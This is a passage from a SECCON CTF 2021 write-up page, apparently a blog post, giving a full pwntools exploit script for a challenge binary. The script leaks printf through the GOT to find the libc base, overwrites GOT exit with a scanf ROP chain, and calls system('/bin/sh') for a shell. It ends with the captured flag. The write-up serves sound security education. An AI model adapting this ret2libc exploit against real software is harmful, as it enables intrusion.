+<span class="line"><span></span></span>
+<span class="line"><span># Specify your GDB script here for debugging</span></span>
+<span class="line"><span># GDB will be launched if the exploit is run via e.g.</span></span>
+<span class="line"><span># ./exploit.py GDB</span></span>
+<span class="line"><span>gdbscript = '''</span></span>
+<span class="line"><span>tbreak main</span></span>
+<span class="line"><span>continue</span></span>
+<span class="line"><span>'''.format(**locals())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def log_print(*msg):</span></span>
+<span class="line"><span>    log.info(" ".join(msg))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def int2byte(x: int):</span></span>
+<span class="line"><span>    return x.to_bytes(exe.bytes, "little")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def wait_for_debugger(io):</span></span>
+<span class="line"><span>    if args.LOCAL and input("debugger?") == "y\n":</span></span>
+<span class="line"><span>        pid = util.proc.pidof(io)[0]</span></span>
+<span class="line"><span>        log_print("The pid is: " + str(pid))</span></span>
+<span class="line"><span>        util.proc.wait_for_debugger(pid)</span></span>
+<span class="line"><span>        log_print("press enter to continue")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== gadget stuff =========</span></span>
+<span class="line"><span>ret_addr = exe_rop.find_gadget(['ret'])[0]</span></span>
+<span class="line"><span>pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]</span></span>
+<span class="line"><span>log_print("pop rdi; ret", hex(pop_rdi_ret_addr))</span></span>
+<span class="line"><span>pop_rsi_r15_ret_addr = exe_rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]</span></span>
+<span class="line"><span>log_print("pop rsi; pop r15; ret", hex(pop_rsi_r15_ret_addr))</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== libc stuff =========</span></span>
+<span class="line"><span>libc_bin_sh_offset = next(libc.search(b"/bin/sh"))</span></span>
+<span class="line"><span>log_print("libc /bin/sh offset", hex(libc_bin_sh_offset))</span></span>
+<span class="line"><span>libc_printf_offset = libc.sym["printf"]</span></span>
+<span class="line"><span>log_print("libc printf offset", hex(libc_printf_offset))</span></span>
+<span class="line"><span>libc_system_offset = libc.sym["system"]</span></span>
+<span class="line"><span>log_print("libc system offset", hex(libc_system_offset))</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== binary stuff =========</span></span>
+<span class="line"><span>main_addr = exe.sym["main"]</span></span>
+<span class="line"><span>log_print("main addr", hex(main_addr))</span></span>
+<span class="line"><span>str_lld_addr = next(exe.search(b"%lld"))</span></span>
+<span class="line"><span>log_print("str.%lld addr", hex(str_lld_addr))</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== plt stuff =========</span></span>
+<span class="line"><span>plt_printf_addr = exe.plt['printf']</span></span>
+<span class="line"><span>log_print("plt.printf addr", hex(plt_printf_addr))</span></span>
+<span class="line"><span>plt_scanf_addr = exe.plt['__isoc99_scanf']</span></span>
+<span class="line"><span>log_print("plt.scanf addr", hex(plt_scanf_addr))</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== GOT stuff =========</span></span>
+<span class="line"><span>got_printf_addr = exe.got['printf']</span></span>
+<span class="line"><span>log_print("got.printf addr", hex(got_printf_addr))</span></span>
+<span class="line"><span>got_exit_addr = exe.got['exit']</span></span>
+<span class="line"><span>log_print("got.exit addr", hex(got_exit_addr))</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== stack stuff =========</span></span>
+<span class="line"><span># stack = flat({</span></span>
+<span class="line"><span>#     0x0: [</span></span>
+<span class="line"><span>#         b"AAAA",</span></span>
+<span class="line"><span>#         0xaaaa,</span></span>
+<span class="line"><span>#         b"AAAA",</span></span>
+<span class="line"><span>#     ],</span></span>
+<span class="line"><span>#     0x100: b"BBBB",</span></span>
+<span class="line"><span>#     0x200: 0xbbbb,</span></span>
+<span class="line"><span># },filler=b'\x00',length=0x500)</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>writable_addr = 0x404700</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io = start()</span></span>
+<span class="line"><span>wait_for_debugger(io)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># ======== pipline stuff =========</span></span>
+<span class="line"><span># io.send(b"aaaa")</span></span>
+<span class="line"><span># io.sendline(b"aaaa")</span></span>
+<span class="line"><span># io.sendlineafter(b"A: ", b"%d" % 1)</span></span>
+<span class="line"><span>#</span></span>
+<span class="line"><span># io.recv()</span></span>
+<span class="line"><span># io.recvuntil(b"A: ")</span></span>
+<span class="line"><span># ============================</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def main_list_length(payload):</span></span>
+<span class="line"><span>    return 20 + len(payload)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def main_sender(io, payload):</span></span>
+<span class="line"><span>    length = main_list_length(payload)</span></span>
+<span class="line"><span>    for i in range(length):</span></span>
+<span class="line"><span>        if i == 16:</span></span>
+<span class="line"><span>            io.sendlineafter(b"A[%d]: " % i, b"%d" % length)</span></span>
+<span class="line"><span>            continue</span></span>
+<span class="line"><span>        if i == 19:</span></span>
+<span class="line"><span>            io.sendlineafter(b"A[%d]: " % i, b"%d" % 19)</span></span>
+<span class="line"><span>            continue</span></span>
+<span class="line"><span>        if i >= 20:</span></span>
+<span class="line"><span>            io.sendlineafter(b"A[%d]: " % i, b"%d" % payload[i - 20])</span></span>
+<span class="line"><span>            continue</span></span>
+<span class="line"><span>        io.sendlineafter(b"A[%d]: " % i, b"%d" % ord("a"))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># print got.printf, get real address for printf, use this to get libc_base</span></span>
+<span class="line"><span>log_print("Sending first paylaod, get real address for printf, use this to get libc_base")</span></span>
+<span class="line"><span>payload1 = [writable_addr,</span></span>
+<span class="line"><span>            ret_addr,</span></span>
+<span class="line"><span>            pop_rdi_ret_addr,</span></span>
+<span class="line"><span>            got_printf_addr,</span></span>
+<span class="line"><span>            plt_printf_addr,</span></span>
+<span class="line"><span>            ret_addr,</span></span>
+<span class="line"><span>            main_addr]</span></span>
+<span class="line"><span>io.sendlineafter(b"n: ", b"%d" % main_list_length(payload1))</span></span>
+<span class="line"><span>main_sender(io, payload1)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># print(io.recv())</span></span>
+<span class="line"><span>io.recvuntil(b"\n")</span></span>
+<span class="line"><span>val = io.recvuntil(b"n:")[:-2:]</span></span>
+<span class="line"><span>io.recv()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>libc_printf_addr = int.from_bytes(val, "little")</span></span>
+<span class="line"><span>log_print("printf libc addr", hex(libc_printf_addr))</span></span>
+<span class="line"><span>libc_base_addr = libc_printf_addr - libc_printf_offset</span></span>
+<span class="line"><span>log_print("libc base addr", hex(libc_base_addr))</span></span>
+<span class="line"><span>libc_bin_sh_addr = libc_base_addr + libc_bin_sh_offset</span></span>
+<span class="line"><span>log_print("libc bin/sh addr", hex(libc_bin_sh_addr))</span></span>
+<span class="line"><span>libc_system_addr = libc_base_addr + libc_system_offset</span></span>
+<span class="line"><span>log_print("libc system addr", hex(libc_system_addr))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Sending first paylaod, change address in got.exit to printf real addressf so exit(0) not quit the program</span></span>
+<span class="line"><span>log_print("run main again\nSending second paylaod, change address in got.exit to got.printf so exit(0) not quit the program")</span></span>
+<span class="line"><span># Sending first paylaod, use scanf("%lld",got_exit_addr) to change got.exit to printf real address</span></span>
+<span class="line"><span>payload2 = [writable_addr,</span></span>
+<span class="line"><span>            ret_addr,</span></span>
+<span class="line"><span>            pop_rdi_ret_addr,</span></span>
+<span class="line"><span>            str_lld_addr,</span></span>
+<span class="line"><span>            pop_rsi_r15_ret_addr,</span></span>
+<span class="line"><span>            got_exit_addr,</span></span>
+<span class="line"><span>            0,</span></span>
+<span class="line"><span>            ret_addr,</span></span>
+<span class="line"><span>            plt_scanf_addr,</span></span>
+<span class="line"><span>            ret_addr,</span></span>
+<span class="line"><span>            main_addr]</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.sendline(b"%d" % main_list_length(payload2))</span></span>
+<span class="line"><span>main_sender(io, payload2)</span></span>
+<span class="line"><span>io.recv()</span></span>
+<span class="line"><span># Sending printf real address</span></span>
+<span class="line"><span>io.sendline(b"%d" % libc_printf_addr)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>log_print("run main again\nSending third paylaod, call system('/bin/sh')")</span></span>
+<span class="line"><span>payload3 = [writable_addr,</span></span>
+<span class="line"><span>            ret_addr,</span></span>
+<span class="line"><span>            pop_rdi_ret_addr,</span></span>
+<span class="line"><span>            libc_bin_sh_addr,</span></span>
+<span class="line"><span>            libc_system_addr]</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io.sendlineafter(b"n: ", b"%d"%main_list_length(payload3))</span></span>
+<span class="line"><span>main_sender(io,payload3)</span></span>
+<span class="line"><span>log_print("get shell")</span></span>
+<span class="line"><span>io.interactive()</span></span>
+<span class="line"><span></span></span></code></pre>
+<h2 id="flag-3">flag</h2>
+<p>SECCON{M4k3_My_4bi1i7i3s_4v3r4g3_in_7h3_N3x7_Lif3_cpwWz9jpoCmKYBvf}</p></div><footer class="ctf-back"><a href="/ctf-writeup/2021/secconctf/">&larr; Seccon CTF 2021</a></footer></article></main><footer class="site-footer"><span>&copy; 2026 Aynakeya</span><div><a href="/rss.xml">RSS</a><a href="/blog/archives/">Archives</a><a href="#top">Back to top &uarr;</a></div></footer></div></div></body></html>
